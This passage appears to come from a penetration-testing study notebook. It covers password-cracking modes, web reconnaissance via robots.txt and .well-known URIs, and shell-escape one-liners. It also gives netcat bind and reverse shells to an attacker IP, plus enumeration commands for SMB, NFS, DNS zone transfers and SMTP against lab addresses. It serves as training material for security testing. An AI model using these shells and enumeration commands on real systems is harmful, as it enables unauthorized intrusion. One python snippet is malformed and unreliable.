<tr><td><code>11600</code></td><td>7-Zip</td></tr>
<tr><td><code>13600</code></td><td>WinZip</td></tr>
<tr><td><code>17200</code></td><td>PKZIP (Compressed)</td></tr>
<tr><td><code>17210</code></td><td>PKZIP (Uncompressed)</td></tr>
<tr><td><code>17220</code></td><td>PKZIP (Compressed Multi-File)</td></tr>
<tr><td><code>17225</code></td><td>PKZIP (Mixed Multi-File)</td></tr>
<tr><td><code>12500</code></td><td>RAR3-hp</td></tr>
<tr><td><code>13000</code></td><td>RAR5</td></tr>
<tr><td><code>23700</code></td><td>RAR3-p (Compressed)</td></tr>
<tr><td><code>23800</code></td><td>RAR3-p (Uncompressed)</td></tr>
<tr><td><code>6211-6243</code></td><td>TrueCrypt</td></tr>
<tr><td><code>13711-13723</code></td><td>VeraCrypt</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="key-considerations"><a class="header" href="#key-considerations">Key Considerations</a></h2>
<p>One of the primary challenges in cracking protected files is the generation and mutation of password lists. In many cases, using standard or publicly known password lists is no longer sufficient, as such lists are often recognized and blocked by built-in security mechanisms.</p>
<p>Files may also be more difficult to crack‚Äîor not crackable at all within a reasonable timeframe‚Äîbecause users are increasingly required to choose longer, randomly generated passwords or complex passphrases.</p>
<p>Nevertheless, attempting to crack password-protected documents is often worthwhile, as they may contain sensitive information that can be leveraged to gain further access.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="crawling"><a class="header" href="#crawling">Crawling</a></h1>
<p>Crawling (or spidering) is the automated process of systematically browsing the web to index and collect information from websites. It is commonly used by search engines to gather data for indexing, but it can also be employed for various other purposes, including security assessments, data mining, and competitive analysis. Crawlers, also known as spiders or bots, follow links on web pages to discover new content and extract relevant information.</p>
<h2 id="how-crawlers-work"><a class="header" href="#how-crawlers-work">How Crawlers Work</a></h2>
<ol>
<li><strong>Starting Point</strong>: Crawlers begin with a list of seed URLs to visit.</li>
<li><strong>Fetching</strong>: The crawler sends HTTP requests to these URLs to retrieve the web pages</li>
<li><strong>Parsing</strong>: The retrieved pages are parsed to extract links and relevant data.</li>
<li><strong>Link Following</strong>: The extracted links are added to the list of URLs to visit</li>
<li><strong>Repetition</strong>: Steps 2-4 are repeated for the new URLs until a specified depth or limit is reached.</li>
</ol>
<h2 id="breadth-first-vs-depth-first-crawling"><a class="header" href="#breadth-first-vs-depth-first-crawling">Breadth-First vs. Depth-First Crawling</a></h2>
<ul>
<li>Breadth-First crawling explores all links at the current depth before moving to the next level, while Depth-First crawling follows a single path down to its end before backtracking. Each method has its advantages and disadvantages depending on the use case.</li>
<li>Depth-First crawling follows a single path down to its end before backtracking.</li>
</ul>
<p>Each method has its advantages and disadvantages depending on the use case.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="robotstxt"><a class="header" href="#robotstxt">robots.txt</a></h1>
<h2 id="overview-12"><a class="header" href="#overview-12">Overview</a></h2>
<p>Imagine you‚Äôre a guest at a grand house party. While you‚Äôre free to mingle and explore, there might be certain rooms marked ‚ÄúPrivate‚Äù that you‚Äôre expected to avoid. This is akin to how <code>robots.txt</code> functions in the world of web crawling. It acts as a virtual ‚Äúetiquette guide‚Äù for bots, outlining which areas of a website they are allowed to access and which are off-limits.</p>
<h2 id="what-is-robotstxt"><a class="header" href="#what-is-robotstxt">What is robots.txt?</a></h2>
<p>Technically, <code>robots.txt</code> is a simple text file placed in the root directory of a website (e.g., <code>www.example.com/robots.txt</code>). It adheres to the Robots Exclusion Standard, guidelines for how web crawlers should behave when visiting a website. This file contains instructions in the form of ‚Äúdirectives‚Äù that tell bots which parts of the website they can and cannot crawl.</p>
<h2 id="how-robotstxt-works"><a class="header" href="#how-robotstxt-works">How robots.txt Works</a></h2>
<p>The directives in <code>robots.txt</code> typically target specific user-agents, which are identifiers for different types of bots. For example, a directive might look like this:</p>
<pre><code>User-agent: *
Disallow: /private/
</code></pre>
<p>This directive tells all user-agents (<code>*</code> is a wildcard) that they are not allowed to access any URLs that start with <code>/private/</code>. Other directives can allow access to specific directories or files, set crawl delays to avoid overloading a server or provide links to sitemaps for efficient crawling.</p>
<h2 id="understanding-robotstxt-structure"><a class="header" href="#understanding-robotstxt-structure">Understanding robots.txt Structure</a></h2>
<p>The <code>robots.txt</code> file is a plain text document that lives in the root directory of a website. It follows a straightforward structure, with each set of instructions, or ‚Äúrecord,‚Äù separated by a blank line. Each record consists of two main components:</p>
<ul>
<li><strong>User-agent</strong>: This line specifies which crawler or bot the following rules apply to. A wildcard (<code>*</code>) indicates that the rules apply to all bots. Specific user agents can also be targeted, such as ‚ÄúGooglebot‚Äù (Google‚Äôs crawler) or ‚ÄúBingbot‚Äù (Microsoft‚Äôs crawler).</li>
<li><strong>Directives</strong>: These lines provide specific instructions to the identified user-agent.</li>
</ul>
<h3 id="common-directives"><a class="header" href="#common-directives">Common Directives</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Directive</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>Disallow</code></td><td>Specifies paths or patterns that the bot should not crawl.</td><td><code>Disallow: /admin/</code> (disallow access to the admin directory)</td></tr>
<tr><td><code>Allow</code></td><td>Explicitly permits the bot to crawl specific paths or patterns, even if they fall under a broader Disallow rule.</td><td><code>Allow: /public/</code> (allow access to the public directory)</td></tr>
<tr><td><code>Crawl-delay</code></td><td>Sets a delay (in seconds) between successive requests from the bot to avoid overloading the server.</td><td><code>Crawl-delay: 10</code> (10-second delay between requests)</td></tr>
<tr><td><code>Sitemap</code></td><td>Provides the URL to an XML sitemap for more efficient crawling.</td><td><code>Sitemap: https://www.example.com/sitemap.xml</code></td></tr>
</tbody>
</table>
</div>
<h2 id="why-respect-robotstxt"><a class="header" href="#why-respect-robotstxt">Why Respect robots.txt?</a></h2>
<p>While <code>robots.txt</code> is not strictly enforceable (a rogue bot could still ignore it), most legitimate web crawlers and search engine bots will respect its directives. This is important for several reasons:</p>
<ul>
<li><strong>Avoiding Overburdening Servers</strong>: By limiting crawler access to certain areas, website owners can prevent excessive traffic that could slow down or even crash their servers.</li>
<li><strong>Protecting Sensitive Information</strong>: Robots.txt can shield private or confidential information from being indexed by search engines.</li>
<li><strong>Legal and Ethical Compliance</strong>: In some cases, ignoring <code>robots.txt</code> directives could be considered a violation of a website‚Äôs terms of service or even a legal issue, especially if it involves accessing copyrighted or private data.</li>
</ul>
<h2 id="robotstxt-in-web-reconnaissance"><a class="header" href="#robotstxt-in-web-reconnaissance">robots.txt in Web Reconnaissance</a></h2>
<p>For web reconnaissance, <code>robots.txt</code> serves as a valuable source of intelligence. While respecting the directives outlined in this file, security professionals can glean crucial insights into the structure and potential vulnerabilities of a target website:</p>
<ul>
<li><strong>Uncovering Hidden Directories</strong>: Disallowed paths in <code>robots.txt</code> often point to directories or files the website owner intentionally wants to keep out of reach from search engine crawlers. These hidden areas might house sensitive information, backup files, administrative panels, or other resources that could interest an attacker.</li>
<li><strong>Mapping Website Structure</strong>: By analyzing the allowed and disallowed paths, security professionals can create a rudimentary map of the website‚Äôs structure. This can reveal sections that are not linked from the main navigation, potentially leading to undiscovered pages or functionalities.</li>
<li><strong>Detecting Crawler Traps</strong>: Some websites intentionally include ‚Äúhoneypot‚Äù directories in <code>robots.txt</code> to lure malicious bots. Identifying such traps can provide insights into the target‚Äôs security awareness and defensive measures.</li>
</ul>
<h2 id="analyzing-robotstxt"><a class="header" href="#analyzing-robotstxt">Analyzing robots.txt</a></h2>
<p>Here‚Äôs an example of a <code>robots.txt</code> file:</p>
<pre><code>User-agent: *
Disallow: /admin/
Disallow: /private/
Allow: /public/

User-agent: Googlebot
Crawl-delay: 10

Sitemap: https://www.example.com/sitemap.xml
</code></pre>
<p>This file contains the following directives:</p>
<ul>
<li>All user agents are disallowed from accessing the <code>/admin/</code> and <code>/private/</code> directories.</li>
<li>All user agents are allowed to access the <code>/public/</code> directory.</li>
<li>The Googlebot (Google‚Äôs web crawler) is specifically instructed to wait 10 seconds between requests.</li>
<li>The sitemap, located at <code>https://www.example.com/sitemap.xml</code>, is provided for easier crawling and indexing.</li>
</ul>
<p>By analyzing this <code>robots.txt</code>, we can infer that the website likely has an admin panel located at <code>/admin/</code> and some private content in the <code>/private/</code> directory.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="shell-harnesses"><a class="header" href="#shell-harnesses">Shell Harnesses</a></h1>
<h2 id="spawning-interactive-shells"><a class="header" href="#spawning-interactive-shells">Spawning Interactive Shells</a></h2>
<p>When landing on a system with a limited/jail shell, there are several alternative methods to spawn an interactive shell.</p>
<h3 id="methods"><a class="header" href="#methods">Methods</a></h3>
<h4 id="python"><a class="header" href="#python"><code>python</code></a></h4>
<p>If Python is preset:</p>
<pre><code class="language-bash">python -c `import pty; pty.spawn("/bin/sh)`
</code></pre>
<h4 id="binsh"><a class="header" href="#binsh"><code>/bin/sh</code></a></h4>
<p>Execute shell in interactive mode:</p>
<pre><code class="language-bash">/bin/sh -i
</code></pre>
<h4 id="perl"><a class="header" href="#perl">Perl</a></h4>
<p>If Perl is present:</p>
<pre><code class="language-bash">perl -e 'exec "/bin/sh";'
</code></pre>
<h4 id="ruby"><a class="header" href="#ruby">Ruby</a></h4>
<p>If Ruby is present:</p>
<pre><code class="language-ruby">ruby: exec "/bin/sh"
</code></pre>
<h4 id="lua"><a class="header" href="#lua">Lua</a></h4>
<p>If Lua is present:</p>
<pre><code class="language-lua">lua: os.execute('/bin/sh')
</code></pre>
<h4 id="awk"><a class="header" href="#awk">AWK</a></h4>
<p>AWK is commonly available on Unix/Linux systems:</p>
<pre><code class="language-bash">awk 'BEGIN {system("/bin/sh")}'
</code></pre>
<h4 id="find"><a class="header" href="#find">Find</a></h4>
<p>Using the <code>find</code> command:</p>
<pre><code class="language-bash"># Using find with awk
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

# Direct execution
find . -exec /bin/sh \; -quit
</code></pre>
<h4 id="vim-1"><a class="header" href="#vim-1">VIM</a></h4>
<p>From within VIM:</p>
<pre><code class="language-bash">vim -c ':!/bin/sh'
</code></pre>
<p>Or escape to shell from VIM:</p>
<pre><code class="language-vim">:set shell=/bin/sh
:shell
</code></pre>
<h3 id="execution-permissions-considerations"><a class="header" href="#execution-permissions-considerations">Execution Permissions Considerations</a></h3>
<ul>
<li>
<p>Check file permissions:</p>
<pre><code class="language-bash">ls -la &lt;path/to/fileorbinary&gt;
</code></pre>
</li>
<li>
<p>Check sudo permissions (requires stable interactive shell):</p>
<pre><code class="language-bash">sudo -l
</code></pre>
</li>
</ul>
<p>Understanding permissions helps identify potential privilege escalation vectors.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="shells-and-payloads"><a class="header" href="#shells-and-payloads">Shells and Payloads</a></h1>
<h2 id="bind-shells"><a class="header" href="#bind-shells">Bind Shells</a></h2>
<p>A shell listens on the compromised system for incoming connections.</p>
<h3 id="challenges-with-bind-shells"><a class="header" href="#challenges-with-bind-shells">Challenges with bind shells</a></h3>
<ul>
<li>Firewalls may block incoming connections.</li>
<li>NAT can complicate direct connections.</li>
<li>A shell will need to be started on the target system beforehand.</li>
<li>May require elevated privileges to bind to certain ports.</li>
</ul>
<h3 id="establish-a-bind-shell-with-netcat"><a class="header" href="#establish-a-bind-shell-with-netcat">Establish a bind shell with netcat</a></h3>
<pre><code class="language-bash">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc -l -p 4444 &gt; /tmp/f
</code></pre>
<p>then connect from your machine:</p>
<pre><code class="language-bash">nc &lt;target_ip&gt; 4444
</code></pre>
<h2 id="reverse-shells"><a class="header" href="#reverse-shells">Reverse Shells</a></h2>
<p>The compromised machine connects back to a listener on the attackers machine. This has a better chance of success because outbound connections are rarely filtered or blocked. A firewall with DPI  (Deep Packet Inspection) may be able to detect and block this traffic.</p>
<h3 id="establish-a-reverse-shell-with-netcat"><a class="header" href="#establish-a-reverse-shell-with-netcat">Establish a reverse shell with netcat</a></h3>
<p>On our machine, setup the listener:</p>
<pre><code class="language-bash">/bin/bash$ nc -lp 443 

</code></pre>
<p>We use the common port https/443 to blend in with normal traffic. On the target machine, run:</p>
<pre><code class="language-bash">/bin/bash$ nc -e /bin/sh &lt;attacker_ip&gt; 443
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="well-known-uris"><a class="header" href="#well-known-uris">Well-Known URIs</a></h1>
<h2 id="overview-13"><a class="header" href="#overview-13">Overview</a></h2>
<p>The <code>.well-known</code> standard, defined in RFC 8615, serves as a standardized directory within a website‚Äôs root domain. This designated location, typically accessible via the <code>/.well-known/</code> path on a web server, centralizes a website‚Äôs critical metadata, including configuration files and information related to its services, protocols, and security mechanisms.</p>
<p>By establishing a consistent location for such data, <code>.well-known</code> simplifies the discovery and access process for various stakeholders, including web browsers, applications, and security tools. This streamlined approach enables clients to automatically locate and retrieve specific configuration files by constructing the appropriate URL. For instance, to access a website‚Äôs security policy, a client would request <code>https://example.com/.well-known/security.txt</code>.</p>
<p>The Internet Assigned Numbers Authority (IANA) maintains a registry of <code>.well-known</code> URIs, each serving a specific purpose defined by various specifications and standards.</p>
<h2 id="common-well-known-uris"><a class="header" href="#common-well-known-uris">Common Well-Known URIs</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>URI Suffix</th><th>Description</th><th>Status</th><th>Reference</th></tr>
</thead>
<tbody>
<tr><td><code>security.txt</code></td><td>Contains contact information for security researchers to report vulnerabilities.</td><td>Permanent</td><td>RFC 9116</td></tr>
<tr><td><code>change-password</code></td><td>Provides a standard URL for directing users to a password change page.</td><td>Provisional</td><td><a href="https://w3c.github.io/webappsec-change-password-url/#the-change-password-well-known-uri">W3C Spec</a></td></tr>
<tr><td><code>openid-configuration</code></td><td>Defines configuration details for OpenID Connect, an identity layer on top of the OAuth 2.0 protocol.</td><td>Permanent</td><td><a href="http://openid.net/specs/openid-connect-discovery-1_0.html">OpenID Connect Discovery</a></td></tr>
<tr><td><code>assetlinks.json</code></td><td>Used for verifying ownership of digital assets (e.g., apps) associated with a domain.</td><td>Permanent</td><td><a href="https://github.com/google/digitalassetlinks/blob/master/well-known/specification.md">Digital Asset Links</a></td></tr>
<tr><td><code>mta-sts.txt</code></td><td>Specifies the policy for SMTP MTA Strict Transport Security (MTA-STS) to enhance email security.</td><td>Permanent</td><td>RFC 8461</td></tr>
</tbody>
</table>
</div>
<p>This is just a small sample of the many <code>.well-known</code> URIs registered with IANA. Each entry in the registry offers specific guidelines and requirements for implementation, ensuring a standardized approach to leveraging the <code>.well-known</code> mechanism for various applications.</p>
<h2 id="web-recon-and-well-known"><a class="header" href="#web-recon-and-well-known">Web Recon and .well-known</a></h2>
<p>In web recon, the <code>.well-known</code> URIs can be invaluable for discovering endpoints and configuration details that can be further tested during a penetration test. One particularly useful URI is <code>openid-configuration</code>.</p>
<h3 id="openid-configuration"><a class="header" href="#openid-configuration">openid-configuration</a></h3>
<p>The <code>openid-configuration</code> URI is part of the OpenID Connect Discovery protocol, an identity layer built on top of the OAuth 2.0 protocol. When a client application wants to use OpenID Connect for authentication, it can retrieve the OpenID Connect Provider‚Äôs configuration by accessing the <code>https://example.com/.well-known/openid-configuration</code> endpoint. This endpoint returns a JSON document containing metadata about the provider‚Äôs endpoints, supported authentication methods, token issuance, and more:</p>
<pre><code class="language-json">{
  "issuer": "https://example.com",
  "authorization_endpoint": "https://example.com/oauth2/authorize",
  "token_endpoint": "https://example.com/oauth2/token",
  "userinfo_endpoint": "https://example.com/oauth2/userinfo",
  "jwks_uri": "https://example.com/oauth2/jwks",
  "response_types_supported": ["code", "token", "id_token"],
  "subject_types_supported": ["public"],
  "id_token_signing_alg_values_supported": ["RS256"],
  "scopes_supported": ["openid", "profile", "email"]
}
</code></pre>
<h3 id="information-obtained-from-openid-configuration"><a class="header" href="#information-obtained-from-openid-configuration">Information Obtained from openid-configuration</a></h3>
<p>The information obtained from the <code>openid-configuration</code> endpoint provides multiple exploration opportunities:</p>
<ul>
<li><strong>Endpoint Discovery</strong>:
<ul>
<li><strong>Authorization Endpoint</strong>: Identifying the URL for user authorization requests.</li>
<li><strong>Token Endpoint</strong>: Finding the URL where tokens are issued.</li>
<li><strong>Userinfo Endpoint</strong>: Locating the endpoint that provides user information.</li>
<li><strong>JWKS URI</strong>: The <code>jwks_uri</code> reveals the JSON Web Key Set (JWKS), detailing the cryptographic keys used by the server.</li>
</ul>
</li>
<li><strong>Supported Scopes and Response Types</strong>: Understanding which scopes and response types are supported helps in mapping out the functionality and limitations of the OpenID Connect implementation.</li>
<li><strong>Algorithm Details</strong>: Information about supported signing algorithms can be crucial for understanding the security measures in place.</li>
</ul>
<h2 id="reconnaissance-strategy"><a class="header" href="#reconnaissance-strategy">Reconnaissance Strategy</a></h2>
<p>Exploring the IANA Registry and experimenting with the various <code>.well-known</code> URIs is an invaluable approach to uncovering additional web reconnaissance opportunities. As demonstrated with the <code>openid-configuration</code> endpoint above, these standardized URIs provide structured access to critical metadata and configuration details, enabling security professionals to comprehensively map out a website‚Äôs security landscape.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="enumeration-1"><a class="header" href="#enumeration-1">Enumeration</a></h1>
<h2 id="principles-of-enumeration"><a class="header" href="#principles-of-enumeration">Principles of Enumeration</a></h2>
<ul>
<li>Enumeration is the systematic process of gathering information about a target system or network to identify potential vulnerabilities and entry points. There are two methods of enumeration: active and passive.</li>
<li>Enumeration is a critical phase in penetration testing and ethical hacking, as it helps security professionals understand the target environment and plan their attack strategies accordingly. It should be considered naive to assume that any system is completely secure without thorough enumeration and analysis. It is equally important to recognize that enumeration can be used for both defensive and offensive purposes in cybersecurity.</li>
<li>Enumeration is a long process that requires patience, attention to detail, and thorough documentation. It is a mistake to immediately try brute-forcing your way into a target system after the initial reconnaissance phase. Instead, take the time to gather as much information as possible about the target, including network topology, operating systems, services, and user accounts. This information can be used to identify potential vulnerabilities and plan a more effective attack strategy.</li>
<li>When attacking a target, it is more important to consider what you do not see, rather than what you do. There is always more than meets the eye, and a skilled attacker will look for hidden vulnerabilities and entry points that may not be immediately apparent. This is why enumeration is such a critical phase in the penetration testing process.</li>
</ul>
<h3 id="active-enumeration"><a class="header" href="#active-enumeration">Active Enumeration</a></h3>
<ul>
<li>Active enumeration involves directly interacting with the target system to gather information. This can include techniques such as port scanning, banner grabbing, and service identification. Active enumeration can provide detailed information about the target but may also be more easily detected by security systems.</li>
</ul>
<h3 id="passive-enumeration"><a class="header" href="#passive-enumeration">Passive Enumeration</a></h3>
<ul>
<li>Passive enumeration involves gathering information without directly interacting with the target system. This can include techniques such as network sniffing, DNS queries, and social engineering. Passive enumeration is less likely to be detected but may provide less detailed information.</li>
<li>OSINT (Open Source Intelligence) is a key component of passive enumeration, involving the collection of publicly available information from sources such as websites, social media, and public databases.</li>
</ul>
<h2 id="layers-of-enumeration"><a class="header" href="#layers-of-enumeration">Layers of Enumeration</a></h2>
<ol>
<li>Internet Presence</li>
</ol>
<ul>
<li>The first layer of enumeration involves gathering information about the target‚Äôs internet presence. This can include identifying domain names, IP addresses, and web servers associated with the target. Tools such as WHOIS, DNS enumeration tools, and web scraping tools can be used to gather this information.</li>
<li>The goal of this layer is to identify all possible target systems and interfaces that can be tested.</li>
</ul>
<ol start="2">
<li>Gateway</li>
</ol>
<ul>
<li>In this layer, we try to understand the interface to the reachable target. This includes identifying firewalls, routers, and other network devices that may be in place to protect the target system. Tools such as Nmap and traceroute can be used to gather this information.</li>
<li>The goal is to understand what we are dealing with and what we have to watch out for.</li>
</ul>
<ol start="3">
<li>Accessible Services</li>
</ol>
<ul>
<li>Here we examine the accessible services of each destination found in the previous layers.</li>
<li>This layer aims to understand the reason and functionality of the target system and gain the necessary knowledge to communicate with it and exploit it for our purposes effectively.</li>
</ul>
<ol start="4">
<li>Processes</li>
</ol>
<ul>
<li>In this layer, we try to understand the processes running on the target system. This includes identifying running services, open ports, and active user sessions. Tools such as Netstat, PsExec, and tasklist can be used to gather this information.</li>
<li>The goal is to identify potential vulnerabilities and entry points that can be exploited.</li>
</ul>
<ol start="5">
<li>Privileges</li>
</ol>
<ul>
<li>This layer focuses on understanding the privileges and permissions of users on the target system. This includes identifying user accounts, group memberships, and access control lists. Tools such as PowerView, BloodHound, and Mimikatz can be used to gather this information. We should also work to identity permissions of running processes identified in the previous layer.</li>
<li>The goal is to identify potential privilege escalation opportunities and plan an effective attack strategy.</li>
</ul>
<ol start="6">
<li>OS Setup</li>
</ol>
<ul>
<li>Here we collect information about the operating system setup of the target system. This includes identifying installed software, patches, and configurations. Tools such as Belarc Advisor, WinAudit, and Lynis can be used to gather this information.</li>
<li>The goal here is to see how the administrators manage the systems and what sensitive internal information we can glean from them.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="footprinting-9"><a href="#footprinting-9" class="header">footprinting</a></h1>
<p>Our goal is not to get at the systems but to find all the ways to get there.</p>
<hr>
<h2 id="enumeration-methodology"><a class="header" href="#enumeration-methodology">Enumeration Methodology</a></h2>
<p>The whole enumeration process is divided into three different levels</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Infrastructure-based enumeration</th><th>Host-based enumeration</th><th>OS-based enumeration</th></tr>
</thead>
<tbody></tbody>
</table>
</div>
<hr>
<h3 id="host-based-enumeration"><a class="header" href="#host-based-enumeration">Host Based Enumeration</a></h3>
<h4 id="ftp-1"><a class="header" href="#ftp-1">FTP</a></h4>
<h5 id="ftp-1-1"><a class="header" href="#ftp-1-1">FTP</a></h5>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Port</th><th>Role</th></tr>
</thead>
<tbody>
<tr><td>TCP/21</td><td>the client and server establish a control channel through <code>TCP port 21</code>. The client sends commands to the server, and the server returns status codes</td></tr>
<tr><td>TCP/20</td><td>data channel (transmission / reception)</td></tr>
</tbody>
</table>
</div>
<ul>
<li>FTP is a clear-text protocol</li>
<li>anonymous FTP allows any user to upload or download files via FTP without using a password</li>
</ul>
<h5 id="tftp"><a class="header" href="#tftp">TFTP</a></h5>
<ul>
<li>Trivial File Transfer Protocol (<code>TFTP</code>) is simpler than FTP</li>
<li>TFTP does not provide user authentication</li>
<li>TFTP uses UDP</li>
<li>file access is solely reliant on the r/w permissions in the OS</li>
</ul>
<h5 id="default-configuration-4"><a class="header" href="#default-configuration-4">Default Configuration</a></h5>
<p>The default configuration of vsFTPd can be found in <code>/etc/vsftpd.conf</code></p>
<p>In addition, there is a file called <code>/etc/ftpusers</code> that serves as a blacklist (any user found in that file cannot login to the ftp service)</p>
<h5 id="downloading-all-files"><a class="header" href="#downloading-all-files">Downloading all files</a></h5>
<pre><code>wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136

</code></pre>
<h5 id="interacting-with-an-ftp-server-that-runs-tlsssl-encryption"><a class="header" href="#interacting-with-an-ftp-server-that-runs-tlsssl-encryption">Interacting with an FTP server that runs TLS/SSL encryption</a></h5>
<pre><code>openssl s_client -connect 10.129.14.136:21 -starttls ftp
</code></pre>
<h4 id="smb"><a class="header" href="#smb">SMB</a></h4>
<h5 id="connecting-to-a-share-anonymously"><a class="header" href="#connecting-to-a-share-anonymously">Connecting to a share (anonymously)</a></h5>
<ul>
<li>listing shares</li>
</ul>
<pre><code>smbclient -N -L //10.129.14.128
</code></pre>
<ul>
<li>connecting to a share</li>
</ul>
<pre><code>smbclient //10.129.14.128/notes
</code></pre>
<h5 id="footprinting-the-service-3"><a class="header" href="#footprinting-the-service-3">Footprinting the service</a></h5>
<ul>
<li>Nmap</li>
</ul>
<pre><code>sudo nmap 10.129.14.128 -sV -sC -p139,445
</code></pre>
<ul>
<li>RPCclient</li>
</ul>
<pre><code>rpcclient -U "" 10.129.14.128
</code></pre>
<ul>
<li>
<p>RPCclient user enumeration</p>
</li>
<li>
<p>Brute Forcing User RIDs</p>
</li>
</ul>
<pre><code>for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" &amp;&amp; echo "";done
</code></pre>
<ul>
<li>Impacket - Samrdump.py
<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py">samrdumpy.py</a></li>
</ul>
<pre><code>samrdump.py 10.129.14.128
</code></pre>
<ul>
<li>Enum4Linux-ng - Enumeration</li>
</ul>
<pre><code>enum4linux-ng.py 10.129.14.128 -A
</code></pre>
<h4 id="nfs"><a class="header" href="#nfs">NFS</a></h4>
<p>Port 111 and 2049
default config is found in <code>/etc/exports</code></p>
<h5 id="footprinting-the-service-1-1"><a class="header" href="#footprinting-the-service-1-1">Footprinting the service</a></h5>
<ul>
<li>Nmap</li>
</ul>
<pre><code>sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
</code></pre>
<p>The <code>rpcinfo</code> NSE script retrieves a list of all currently running RPC services, their names and descriptions, and the ports they use.</p>
<ul>
<li>Show Available NFS Shares</li>
</ul>
<pre><code>showmount -e 10.129.14.128
</code></pre>
<ul>
<li>Mounting NFS Share</li>
</ul>
<pre><code>mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
</code></pre>
<h4 id="dns-3"><a class="header" href="#dns-3">DNS</a></h4>
<p>Reference: <a href="https://www.youtube.com/watch?v=HnUDtycXSNE">DNS Explained in details</a></p>
<p>An entry in a DNS nameserver, also known as a DNS record, contains specific information about a domain and its associated services. Each entry in a DNS nameserver is formatted in a way that helps DNS resolvers understand how to handle requests for that domain. Here‚Äôs a breakdown of what an entry typically looks like:</p>
<pre><code>&lt;NAME&gt; &lt;TTL&gt; &lt;CLASS&gt; &lt;TYPE&gt; &lt;DATA&gt;
</code></pre>
<p>examples:</p>
<ul>
<li><code>example.com. 3600 IN A 192.0.2.1</code></li>
<li><code>example.com. 3600 IN AAAA 2001:db8::1</code></li>
<li><code>www.example.com. 3600 IN CNAME example.com.</code></li>
<li><code>example.com. 3600 IN MX 10 mail.example.com.</code></li>
<li><code>example.com. 3600 IN NS ns1.example.com.</code></li>
</ul>
<h5 id="footprinting-the-service-2-1"><a class="header" href="#footprinting-the-service-2-1">Footprinting the service</a></h5>
<ul>
<li>DIG - NS Query
the DNS server can be queried as to which other name servers are known.</li>
</ul>
<pre><code>dig ns inlanefreight.htb @10.129.14.128
</code></pre>
<ul>
<li>DIG - ANY Query
We can use the option <code>ANY</code> to view all available records. This will cause the server to show us all available entries that it is willing to disclose. It is important to note that not all entries from the zones will be shown.</li>
</ul>
<pre><code>dig any inlanefreight.htb @10.129.14.128
</code></pre>
<ul>
<li>DIG - AXFR Zone Transfer
Zone transfer refers to the transfer of zones to another server in DNS, which generally happens over TCP port 53. This procedure is abbreviated <code>Asynchronous Full Transfer Zone</code> (<code>AXFR</code>).</li>
</ul>
<pre><code>dig axfr inlanefreight.htb @10.129.14.128
</code></pre>
<ul>
<li>DIG - AXFR Zone Transfer - Internal</li>
</ul>
<pre><code>dig axfr internal.inlanefreight.htb @10.129.14.128
</code></pre>
<ul>
<li>Subdomain Brute Forcing</li>
</ul>
<pre><code>for sub in $(cat /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
</code></pre>
<p>or using a tool like <a href="https://github.com/fwaeytens/dnsenum">DNSEnum</a></p>
<pre><code>dnsenum --dnsserver 10.129.11.220  --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
</code></pre>
<p>(You might also use <code>/usr/share/wordlists/seclists/Discovery/DNS/fierce-hostlist.txt</code>)</p>
<h4 id="smtp"><a class="header" href="#smtp">SMTP</a></h4>
<p>SMTP runs on port 25 (TCP)</p>
<h5 id="smtp-commands"><a class="header" href="#smtp-commands">SMTP commands</a></h5>
<ul>
<li>connecting to the smtp server</li>
</ul>
<pre><code>telnet 10.129.14.128 25
</code></pre>
<p>‚ùó: Sometimes we may have to work through a web proxy. We can also make this web proxy connect to the SMTP server. The command that we would send would then look something like this: <code>CONNECT 10.129.14.128:25 HTTP/1.0</code></p>
<h5 id="footprinting"><a class="header" href="#footprinting">Footprinting</a></h5>
<ul>
<li>Nmap - Open Relay</li>
</ul>
<pre><code>sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
</code></pre>
<ul>
<li>Enumerating users
There is a metasploit module for this</li>
</ul>
<pre><code>search scanner/smtp/smtp_enum
</code></pre>
<h4 id="imap--pop3-1"><a class="header" href="#imap--pop3-1">IMAP / POP3</a></h4>
<p>IMAP (TCP 143)
POP3 (TCP 110)</p>
<h5 id="imap-commands-1"><a class="header" href="#imap-commands-1">IMAP Commands</a></h5>
<p>(Chatgpt is really helpful for writing imap commands)</p>
<h5 id="footprinting-the-service-3-1"><a class="header" href="#footprinting-the-service-3-1">Footprinting the service</a></h5>
<ul>
<li>Nmap</li>
</ul>
<pre><code>sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
</code></pre>
<ul>
<li>curl</li>
</ul>
<pre><code>curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
</code></pre>
<ul>
<li>OpenSSL - TLS Encrypted Interaction POP3</li>
</ul>
<pre><code>openssl s_client -connect 10.129.14.128:pop3s
</code></pre>
<ul>
<li>OpenSSL - TLS Encrypted Interaction IMAP</li>
</ul>
<pre><code>openssl s_client -connect 10.129.14.128:imaps
</code></pre>
<h4 id="snmp-1"><a class="header" href="#snmp-1">SNMP</a></h4>
<p>SNMP (UDP 161)</p>
